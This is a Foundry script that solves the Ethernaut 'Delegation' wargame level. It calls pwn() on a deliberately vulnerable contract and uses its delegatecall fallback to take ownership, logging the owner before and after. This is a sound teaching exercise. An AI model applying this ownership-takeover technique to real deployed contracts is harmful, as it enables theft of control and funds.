// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "ethernaut/Delegation/Delegation.sol";
import "ethernaut/EthernautTestHelpers.sol";

contract Delegation_script is Test, EthernautTestHelpers {
    function run() public {
        uint256 PKEY = vm.envUint("DEPLOYMENT_KEY");
        vm.startBroadcast(PKEY);
        Delegation instance = Delegation(
            0x7C9DD44B5BbB4F2914cd0B3fF803aBE15058f512
        );
        address ownerOf = instance.owner();
        console.log("Owner: %s", ownerOf);
        (bool success, ) = address(instance).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Failed to call pwn()");
        console.log("Success: %s", success);
        ownerOf = instance.owner();
        console.log("Owner: %s", ownerOf);
        // console.log("Owner: %s", abi.decode(owner, (address)));
        vm.stopBroadcast();
    }
}
